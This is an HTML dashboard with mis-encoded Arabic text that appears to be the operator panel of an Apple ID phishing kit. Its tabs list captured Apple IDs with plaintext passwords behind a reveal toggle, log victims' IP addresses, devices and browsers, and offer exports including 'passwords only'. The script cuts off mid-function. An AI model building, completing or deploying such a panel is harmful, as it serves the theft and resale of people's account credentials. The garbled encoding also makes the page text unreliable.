<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <title>Ù„ÙˆØ­Ø© ØªØ­ÙƒÙ… Apple - Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ù…Ø¨Ø§Ø´Ø±</title>
    <style>
        :root {
            --primary: #007AFF;
            --primary-dark: #0056CC;
            --success: #34C759;
            --danger: #FF3B30;
            --warning: #FF9500;
            --info: #5AC8FA;
            --dark: #1D1D1F;
            --light: #F5F5F7;
            --gray: #8E8E93;
            --border: #E5E5EA;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        
        body {
            background: var(--light);
            color: var(--dark);
            line-height: 1.6;
        }
        
        /* Ø§Ù„Ù‡ÙŠØ¯Ø± */
        .dashboard-header {
            background: linear-gradient(135deg, var(--dark), #2C2C2E);
            color: white;
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        
        .header-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .logo {
            font-size: 28px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .live-indicator {
            background: var(--success);
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 5px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        .header-right {
            display: flex;
            gap: 10px;
        }
        
        /* Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª */
        .stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            padding: 20px;
        }
        
        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            text-align: center;
            transition: transform 0.2s;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
        }
        
        .stat-icon {
            font-size: 32px;
            margin-bottom: 10px;
        }
        
        .stat-number {
            font-size: 32px;
            font-weight: bold;
            color: var(--primary);
        }
        
        .stat-label {
            color: var(--gray);
            margin-top: 5px;
            font-size: 14px;
        }
        
        .stat-trend {
            font-size: 12px;
            margin-top: 5px;
        }
        
        .trend-up { color: var(--success); }
        .trend-down { color: var(--danger); }
        
        /* Ø§Ù„Ø¬Ø¯Ø§ÙˆÙ„ */
        .section {
            background: white;
            border-radius: 12px;
            margin: 20px;
            padding: 20px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
        }
        
        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--border);
        }
        
        .section-title {
            font-size: 20px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .table-container {
            overflow-x: auto;
            max-height: 400px;
            overflow-y: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }
        
        th, td {
            padding: 12px 15px;
            text-align: right;
            border-bottom: 1px solid var(--border);
        }
        
        th {
            background: var(--light);
            font-weight: 600;
            color: var(--dark);
            position: sticky;
            top: 0;
        }
        
        tr:hover {
            background: var(--light);
        }
        
        /* Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­Ø³Ø§Ø³Ø© */
        .sensitive-data {
            font-family: monospace;
            background: #f8f9fa;
            padding: 4px 8px;
            border-radius: 4px;
            border: 1px solid var(--border);
        }
        
        .password-cell {
            position: relative;
        }
        
        .toggle-password {
            background: none;
            border: none;
            color: var(--primary);
            cursor: pointer;
            font-size: 12px;
            margin-right: 5px;
        }
        
        .password-view {
            display: none;
            background: #fff8e1;
            padding: 5px;
            border-radius: 4px;
            margin-top: 5px;
            font-family: monospace;
            border: 1px solid #ffecb3;
        }
        
        /* Ø³Ø¬Ù„Ø§Øª Kelog */
        .log-entry {
            padding: 10px;
            border-left: 4px solid var(--primary);
            margin-bottom: 10px;
            background: var(--light);
            border-radius: 4px;
        }
        
        .log-error { border-left-color: var(--danger); }
        .log-security { border-left-color: var(--warning); }
        .log-success { border-left-color: var(--success); }
        
        .log-time {
            font-size: 12px;
            color: var(--gray);
            margin-bottom: 5px;
        }
        
        .log-action {
            font-weight: 600;
            margin-bottom: 5px;
        }
        
        .log-data {
            font-size: 12px;
            color: var(--gray);
            white-space: pre-wrap;
            max-height: 100px;
            overflow-y: auto;
        }
        
        /* Ø§Ù„Ø£Ø²Ø±Ø§Ø± */
        .btn {
            padding: 8px 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }
        
        .btn-primary {
            background: var(--primary);
            color: white;
        }
        
        .btn-danger {
            background: var(--danger);
            color: white;
        }
        
        .btn-success {
            background: var(--success);
            color: white;
        }
        
        .btn-warning {
            background: var(--warning);
            color: white;
        }
        
        .btn:hover {
            opacity: 0.9;
            transform: translateY(-1px);
        }
        
        /* Ø§Ù„Ø¨Ø­Ø« ÙˆØ§Ù„ØªØµÙÙŠØ© */
        .search-box {
            padding: 8px 15px;
            border: 1px solid var(--border);
            border-radius: 8px;
            width: 300px;
            font-size: 14px;
        }
        
        .filters {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .filter-select {
            padding: 8px 15px;
            border: 1px solid var(--border);
            border-radius: 8px;
            background: white;
            font-size: 14px;
        }
        
        /* Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…Ø¨Ø§Ø´Ø± */
        .auto-refresh {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 20px;
            padding: 10px;
            background: var(--light);
            border-radius: 8px;
        }
        
        .refresh-btn {
            background: var(--primary);
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        /* Ø§Ù„ØªØ¨ÙˆÙŠØ¨Ø§Øª */
        .tabs {
            display: flex;
            border-bottom: 1px solid var(--border);
            margin-bottom: 20px;
        }
        
        .tab {
            padding: 12px 24px;
            cursor: pointer;
            border-bottom: 3px solid transparent;
            transition: all 0.2s;
        }
        
        .tab.active {
            border-bottom-color: var(--primary);
            color: var(--primary);
            font-weight: 600;
        }
        
        .tab:hover:not(.active) {
            background: var(--light);
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        /* Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù†Ø¸Ø§Ù… */
        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: var(--success);
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            display: none;
            z-index: 1001;
            animation: slideUp 0.3s ease;
        }
        
        @keyframes slideUp {
            from {
                transform: translateY(100%);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
        
        /* Ø§Ù„Ø£Ø­Ø¬Ø§Ù… Ø§Ù„ØµØºÙŠØ±Ø© */
        @media (max-width: 768px) {
            .stats-container {
                grid-template-columns: 1fr;
            }
            
            .header-right {
                flex-direction: column;
            }
            
            .search-box {
                width: 100%;
            }
            
            .section {
                margin: 10px;
                padding: 15px;
            }
        }
        
        /* Ø§Ù„Ø£Ø­Ø¬Ø§Ù… Ø§Ù„ØµØºÙŠØ±Ø© Ø¬Ø¯Ø§Ù‹ */
        @media (max-width: 480px) {
            .dashboard-header {
                flex-direction: column;
                gap: 15px;
                text-align: center;
            }
            
            .filters {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <!-- Ø§Ù„Ù‡ÙŠØ¯Ø± -->
    <div class="dashboard-header">
        <div class="header-left">
            <div class="logo">
                <span>ğŸ</span>
                Ù„ÙˆØ­Ø© ØªØ­ÙƒÙ… Apple
            </div>
            <div class="live-indicator" id="liveIndicator">
                <span class="dot">â—</span>
                Ù…Ø¨Ø§Ø´Ø±
            </div>
        </div>
        <div class="header-right">
            <button class="btn btn-primary" onclick="refreshAllData()">
                <span>ğŸ”„</span>
                ØªØ­Ø¯ÙŠØ«
            </button>
            <a href="index.html" class="btn btn-warning">
                <span>ğŸ </span>
                Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©
            </a>
            <button class="btn btn-danger" onclick="clearAllData()">
                <span>ğŸ—‘ï¸</span>
                ØªÙ†Ø¸ÙŠÙ
            </button>
        </div>
    </div>
    
    <!-- Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª -->
    <div class="stats-container" id="statsContainer">
        <!-- Ø³ÙŠØªÙ… Ù…Ù„Ø¤Ù‡Ø§ Ø¨Ø§Ù„Ø¬Ø§ÙØ§Ø³ÙƒØ±ÙŠØ¨Øª -->
    </div>
    
    <!-- Ø§Ù„ØªØ¨ÙˆÙŠØ¨Ø§Øª -->
    <div class="section">
        <div class="tabs">
            <div class="tab active" onclick="switchTab('credentials')">ğŸ” Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„</div>
            <div class="tab" onclick="switchTab('visits')">ğŸ‘€ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª</div>
            <div class="tab" onclick="switchTab('kelog')">ğŸ“Š Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…</div>
            <div class="tab" onclick="switchTab('export')">ğŸ“ Ø§Ù„ØªØµØ¯ÙŠØ±</div>
            <div class="tab" onclick="switchTab('settings')">âš™ï¸ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª</div>
        </div>
        
        <!-- ØªØ¨ÙˆÙŠØ¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„ -->
        <div class="tab-content active" id="tabCredentials">
            <div class="section-header">
                <h2 class="section-title">ğŸ” Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù…Ø³Ø¬Ù„Ø©</h2>
                <input type="text" class="search-box" placeholder="Ø¨Ø­Ø« Ø¹Ù† Apple ID..." 
                       onkeyup="filterTable('credentialsTable', this.value)">
            </div>
            
            <div class="table-container">
                <table id="credentialsTable">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Ø§Ù„ÙˆÙ‚Øª</th>
                            <th>Apple ID</th>
                            <th>ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</th>
                            <th>Ø¹Ù†ÙˆØ§Ù† IP</th>
                            <th>Ø§Ù„Ø¬Ù‡Ø§Ø²</th>
                            <th>Ø§Ù„Ù…ØªØµÙØ­</th>
                            <th>Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª</th>
                        </tr>
                    </thead>
                    <tbody id="credentialsBody">
                        <!-- Ø³ÙŠØªÙ… Ù…Ù„Ø¤Ù‡Ø§ Ø¨Ø§Ù„Ø¬Ø§ÙØ§Ø³ÙƒØ±ÙŠØ¨Øª -->
                    </tbody>
                </table>
            </div>
            
            <div class="empty-state" id="emptyCredentials" style="display: none; text-align: center; padding: 40px; color: var(--gray);">
                Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„ Ù…Ø³Ø¬Ù„Ø© Ø­ØªÙ‰ Ø§Ù„Ø¢Ù†
            </div>
            
            <div style="margin-top: 20px; display: flex; gap: 10px;">
                <button class="btn btn-danger" onclick="deleteAllCredentials()">
                    ğŸ—‘ï¸ Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                </button>
                <button class="btn btn-success" onclick="exportCredentials()">
                    ğŸ“¥ ØªØµØ¯ÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                </button>
                <button class="btn btn-primary" onclick="refreshCredentials()">
                    ğŸ”„ ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¬Ø¯ÙˆÙ„
                </button>
            </div>
        </div>
        
        <!-- ØªØ¨ÙˆÙŠØ¨ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª -->
        <div class="tab-content" id="tabVisits">
            <div class="section-header">
                <h2 class="section-title">ğŸ‘€ Ø³Ø¬Ù„ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª</h2>
                <div class="filters">
                    <select class="filter-select" onchange="filterVisits(this.value)">
                        <option value="">Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©</option>
                        <option value="mobile">Ø§Ù„Ù‡ÙˆØ§ØªÙ</option>
                        <option value="desktop">Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„ÙƒÙ…Ø¨ÙŠÙˆØªØ±</option>
                    </select>
                    <input type="text" class="search-box" placeholder="Ø¨Ø­Ø« Ø¹Ù† IP..." 
                           onkeyup="filterTable('visitsTable', this.value)">
                </div>
            </div>
            
            <div class="table-container">
                <table id="visitsTable">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Ø§Ù„ÙˆÙ‚Øª</th>
                            <th>Ø¹Ù†ÙˆØ§Ù† IP</th>
                            <th>Ø§Ù„Ø¬Ù‡Ø§Ø²</th>
                            <th>Ø§Ù„Ù…ØªØµÙØ­</th>
                            <th>Ø§Ù„Ø¯Ù‚Ø©</th>
                            <th>Ø§Ù„Ù„ØºØ©</th>
                            <th>Ø§Ù„Ù…ØµØ¯Ø±</th>
                        </tr>
                    </thead>
                    <tbody id="visitsBody">
                        <!-- Ø³ÙŠØªÙ… Ù…Ù„Ø¤Ù‡Ø§ Ø¨Ø§Ù„Ø¬Ø§ÙØ§Ø³ÙƒØ±ÙŠØ¨Øª -->
                    </tbody>
                </table>
            </div>
            
            <div class="empty-state" id="emptyVisits" style="display: none; text-align: center; padding: 40px; color: var(--gray);">
                Ù„Ø§ ØªÙˆØ¬Ø¯ Ø²ÙŠØ§Ø±Ø§Øª Ù…Ø³Ø¬Ù„Ø© Ø­ØªÙ‰ Ø§Ù„Ø¢Ù†
            </div>
        </div>
        
        <!-- ØªØ¨ÙˆÙŠØ¨ Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù… -->
        <div class="tab-content" id="tabKelog">
            <div class="section-header">
                <h2 class="section-title">ğŸ“Š Ø³Ø¬Ù„Ø§Øª Ù†Ø¸Ø§Ù… Kelog</h2>
                <div class="filters">
                    <select class="filter-select" onchange="filterKelog('type', this.value)">
                        <option value="">Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ù†ÙˆØ§Ø¹</option>
                        <option value="security">Ø£Ù…Ù†</option>
                        <option value="error">Ø£Ø®Ø·Ø§Ø¡</option>
                        <option value="info">Ù…Ø¹Ù„ÙˆÙ…Ø§Øª</option>
                        <option value="visit">Ø²ÙŠØ§Ø±Ø§Øª</option>
                    </select>
                    <input type="text" class="search-box" placeholder="Ø¨Ø­Ø« ÙÙŠ Ø§Ù„Ø³Ø¬Ù„Ø§Øª..." 
                           onkeyup="filterKelog('search', this.value)">
                </div>
            </div>
            
            <div class="table-container" id="kelogContainer">
                <!-- Ø³ÙŠØªÙ… Ù…Ù„Ø¤Ù‡Ø§ Ø¨Ø§Ù„Ø¬Ø§ÙØ§Ø³ÙƒØ±ÙŠØ¨Øª -->
            </div>
            
            <div class="empty-state" id="emptyKelog" style="display: none; text-align: center; padding: 40px; color: var(--gray);">
                Ù„Ø§ ØªÙˆØ¬Ø¯ Ø³Ø¬Ù„Ø§Øª ÙÙŠ Ù†Ø¸Ø§Ù… Kelog Ø­ØªÙ‰ Ø§Ù„Ø¢Ù†
            </div>
            
            <div class="auto-refresh">
                <label>
                    <input type="checkbox" id="kelogAutoRefresh" checked>
                    Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ù„Ù„Ø³Ø¬Ù„Ø§Øª
                </label>
                <button class="refresh-btn" onclick="refreshKelog()">
                    <span>ğŸ”„</span>
                    ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø³Ø¬Ù„Ø§Øª
                </button>
                <button class="btn btn-warning" onclick="clearKelog()">
                    ğŸ—‘ï¸ Ù…Ø³Ø­ Ø§Ù„Ø³Ø¬Ù„Ø§Øª
                </button>
                <button class="btn btn-success" onclick="exportKelog()">
                    ğŸ“¥ ØªØµØ¯ÙŠØ± Ø§Ù„Ø³Ø¬Ù„Ø§Øª
                </button>
            </div>
        </div>
        
        <!-- ØªØ¨ÙˆÙŠØ¨ Ø§Ù„ØªØµØ¯ÙŠØ± -->
        <div class="tab-content" id="tabExport">
            <div class="section-header">
                <h2 class="section-title">ğŸ“ ØªØµØ¯ÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</h2>
            </div>
            
            <div style="margin-bottom: 30px;">
                <h3 style="margin-bottom: 15px;">ØªØµØ¯ÙŠØ± Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</h3>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
                    <button class="btn btn-primary" onclick="exportData('json')">
                        <span>ğŸ”„</span>
                        ØªØµØ¯ÙŠØ± ÙƒÙ€ JSON
                    </button>
                    <button class="btn btn-primary" onclick="exportData('csv')">
                        <span>ğŸ“Š</span>
                        ØªØµØ¯ÙŠØ± ÙƒÙ€ CSV
                    </button>
                    <button class="btn btn-primary" onclick="exportData('txt')">
                        <span>ğŸ“</span>
                        ØªØµØ¯ÙŠØ± ÙƒÙ€ Ù†Øµ
                    </button>
                    <button class="btn btn-success" onclick="exportAllFiles()">
                        <span>ğŸ“</span>
                        ØªØµØ¯ÙŠØ± Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù„ÙØ§Øª
                    </button>
                </div>
            </div>
            
            <div style="margin-bottom: 30px;">
                <h3 style="margin-bottom: 15px;">ØªØµØ¯ÙŠØ± Ø¬Ø²Ø¦ÙŠ</h3>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
                    <button class="btn btn-warning" onclick="exportCredentialsOnly()">
                        <span>ğŸ”</span>
                        ØªØµØ¯ÙŠØ± ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ± ÙÙ‚Ø·
                    </button>
                    <button class="btn btn-warning" onclick="exportVisitsOnly()">
                        <span>ğŸ‘€</span>
                        ØªØµØ¯ÙŠØ± Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª ÙÙ‚Ø·
                    </button>
                    <button class="btn btn-warning" onclick="exportKelogOnly()">
                        <span>ğŸ“Š</span>
                        ØªØµØ¯ÙŠØ± Ø§Ù„Ø³Ø¬Ù„Ø§Øª ÙÙ‚Ø·
                    </button>
                </div>
            </div>
            
            <div>
                <h3 style="margin-bottom: 15px;">Ø®ÙŠØ§Ø±Ø§Øª Ù…ØªÙ‚Ø¯Ù…Ø©</h3>
                <div style="display: flex; flex-direction: column; gap: 15px;">
                    <div>
                        <label style="display: block; margin-bottom: 5px;">Ù†Ø·Ø§Ù‚ Ø§Ù„ØªØ§Ø±ÙŠØ®:</label>
                        <div style="display: flex; gap: 10px;">
                            <input type="date" id="exportStartDate" style="padding: 8px; border: 1px solid var(--border); border-radius: 8px;">
                            <input type="date" id="exportEndDate" style="padding: 8px; border: 1px solid var(--border); border-radius: 8px;">
                            <button class="btn btn-info" onclick="exportByDate()">
                                ØªØµØ¯ÙŠØ± Ø¨Ø§Ù„Ù†Ø·Ø§Ù‚
                            </button>
                        </div>
                    </div>
                    
                    <div>
                        <label style="display: block; margin-bottom: 5px;">Ø§Ù„ØªØ´ÙÙŠØ±:</label>
                        <div style="display: flex; gap: 10px; align-items: center;">
                            <input type="checkbox" id="exportEncrypt">
                            <label for="exportEncrypt">ØªØ´ÙÙŠØ± Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…ØµØ¯Ø±Ø©</label>
                            <input type="password" id="encryptPassword" placeholder="ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± Ø§Ù„ØªØ´ÙÙŠØ±" 
                                   style="padding: 8px; border: 1px solid var(--border); border-radius: 8px; display: none;">
                        </div>
                    </div>
                    
                    <div>
                        <label style="display: block; margin-bottom: 5px;">Ø§Ù„Ø¶ØºØ·:</label>
                        <div style="display: flex; gap: 10px;">
                            <button class="btn btn-info" onclick="createZipArchive()">
                                ğŸ“¦ Ø¥Ù†Ø´Ø§Ø¡ Ø£Ø±Ø´ÙŠÙ ZIP
                            </button>
                            <button class="btn btn-info" onclick="backupSystem()">
                                ğŸ’¾ Ø¥Ù†Ø´Ø§Ø¡ Ù†Ø³Ø®Ø© Ø§Ø­ØªÙŠØ§Ø·ÙŠØ©
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- ØªØ¨ÙˆÙŠØ¨ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª -->
        <div class="tab-content" id="tabSettings">
            <div class="section-header">
                <h2 class="section-title">âš™ï¸ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…</h2>
            </div>
            
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;">
                <div class="setting-group">
                    <h3 style="margin-bottom: 10px;">ğŸ”„ Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ</h3>
                    <div style="display: flex; flex-direction: column; gap: 10px;">
                        <label>
                            <input type="checkbox" id="autoRefreshSettings" checked>
                            ØªÙØ¹ÙŠÙ„ Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
                        </label>
                        <div>
                            <label style="display: block; margin-bottom: 5px;">ÙØªØ±Ø© Ø§Ù„ØªØ­Ø¯ÙŠØ« (Ø«Ø§Ù†ÙŠØ©):</label>
                            <select id="refreshInterval" style="padding: 8px; border: 1px solid var(--border); border-radius: 8px; width: 100%;">
                                <option value="5">5 Ø«ÙˆØ§Ù†ÙŠ</option>
                                <option value="10" selected>10 Ø«ÙˆØ§Ù†ÙŠ</option>
                                <option value="30">30 Ø«Ø§Ù†ÙŠØ©</option>
                                <option value="60">Ø¯Ù‚ÙŠÙ‚Ø©</option>
                            </select>
                        </div>
                    </div>
                </div>
                
                <div class="setting-group">
                    <h3 style="margin-bottom: 10px;">ğŸ”’ Ø§Ù„Ø£Ù…Ø§Ù†</h3>
                    <div style="display: flex; flex-direction: column; gap: 10px;">
                        <label>
                            <input type="checkbox" id="encryptData" checked>
                            ØªØ´ÙÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø®Ø²Ù†Ø©
                        </label>
                        <label>
                            <input type="checkbox" id="autoClean" checked>
                            Ø§Ù„ØªÙ†Ø¸ÙŠÙ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ù„Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø©
                        </label>
                        <div>
                            <label style="display: block; margin-bottom: 5px;">Ø§Ù„Ø§Ø­ØªÙØ§Ø¸ Ø¨Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª (Ø£ÙŠØ§Ù…):</label>
                            <select id="retentionDays" style="padding: 8px; border: 1px solid var(--border); border-radius: 8px; width: 100%;">
                                <option value="1">ÙŠÙˆÙ… ÙˆØ§Ø­Ø¯</option>
                                <option value="3">3 Ø£ÙŠØ§Ù…</option>
                                <option value="7" selected>Ø£Ø³Ø¨ÙˆØ¹</option>
                                <option value="30">Ø´Ù‡Ø±</option>
                                <option value="90">3 Ø£Ø´Ù‡Ø±</option>
                            </select>
                        </div>
                    </div>
                </div>
                
                <div class="setting-group">
                    <h3 style="margin-bottom: 10px;">ğŸ“Š Ù†Ø¸Ø§Ù… Kelog</h3>
                    <div style="display: flex; flex-direction: column; gap: 10px;">
                        <label>
                            <input type="checkbox" id="kelogEnabled" checked>
                            ØªÙØ¹ÙŠÙ„ Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ³Ø¬ÙŠÙ„
                        </label>
                        <label>
                            <input type="checkbox" id="kelogRealTime" checked>
                            Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…Ø¨Ø§Ø´Ø± Ù„Ù„Ø³Ø¬Ù„Ø§Øª
                        </label>
                        <div>
                            <label style="display: block; margin-bottom: 5px;">Ø£Ù‚ØµÙ‰ Ø¹Ø¯Ø¯ Ù„Ù„Ø³Ø¬Ù„Ø§Øª:</label>
                            <select id="maxLogs" style="padding: 8px; border: 1px solid var(--border); border-radius: 8px; width: 100%;">
                                <option value="500">500 Ø³Ø¬Ù„</option>
                                <option value="1000">1000 Ø³Ø¬Ù„</option>
                                <option value="2000" selected>2000 Ø³Ø¬Ù„</option>
                                <option value="5000">5000 Ø³Ø¬Ù„</option>
                            </select>
                        </div>
                    </div>
                </div>
                
                <div class="setting-group">
                    <h3 style="margin-bottom: 10px;">ğŸ“± Ø§Ù„ØªÙˆØ§ÙÙ‚</h3>
                    <div style="display: flex; flex-direction: column; gap: 10px;">
                        <label>
                            <input type="checkbox" id="mobileSupport" checked>
                            Ø¯Ø¹Ù… Ø§Ù„Ù‡ÙˆØ§ØªÙ Ø§Ù„Ø°ÙƒÙŠØ©
                        </label>
                        <label>
                            <input type="checkbox" id="indexedDBSupport" checked>
                            Ø§Ø³ØªØ®Ø¯Ø§Ù… IndexedDB
                        </label>
                        <label>
                            <input type="checkbox" id="autoFileDownload" checked>
                            Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ù„Ù„Ù…Ù„ÙØ§Øª
                        </label>
                    </div>
                </div>
            </div>
            
            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid var(--border);">
                <div style="display: flex; gap: 10px;">
                    <button class="btn btn-success" onclick="saveSettings()">
                        ğŸ’¾ Ø­ÙØ¸ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª
                    </button>
                    <button class="btn btn-warning" onclick="resetSettings()">
                        ğŸ”„ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªØ¹ÙŠÙŠÙ†
                    </button>
                    <button class="btn btn-info" onclick="showSystemInfo()">
                        â„¹ï¸ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…
                    </button>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù†Ø¸Ø§Ù… -->
    <div class="notification" id="notification"></div>

    <script>
        // Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        let credentials = [];
        let visits = [];
        let kelogEntries = [];
        let refreshInterval = null;
        let currentTab = 'credentials';
        
        // ØªÙ‡ÙŠØ¦Ø© Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…
        document.addEventListener('DOMContentLoaded', async function() {
            console.log('ğŸš€ Ø¨Ø¯Ø¡ ØªÙ‡ÙŠØ¦Ø© Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…...');
            
            // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
            await loadAllData();
            
            // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª
            updateStats();
            
            // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
            startAutoRefresh();
            
            // Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ù„ØªØ­Ø¯ÙŠØ«Ø§Øª Ø§Ù„Ù…Ø¨Ø§Ø´Ø±Ø©
            setupRealTimeListeners();
            
            // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª
            loadSettings();
            
            console.log('âœ… Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… Ø¬Ø§Ù‡Ø²Ø© Ù„Ù„Ø¹Ù…Ù„');
            showNotification('Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… Ø¬Ø§Ù‡Ø²Ø© Ù„Ù„Ø¹Ù…Ù„', 'success');
        });
        
        // ØªØ­Ù…ÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        async function loadAllData() {
            try {
                // ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
                await loadCredentials();
                
                // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª
                await loadVisits();
                
                // ØªØ­Ù…ÙŠÙ„ Ø³Ø¬Ù„Ø§Øª Kelog
                await loadKelog();
                
            } catch (error) {
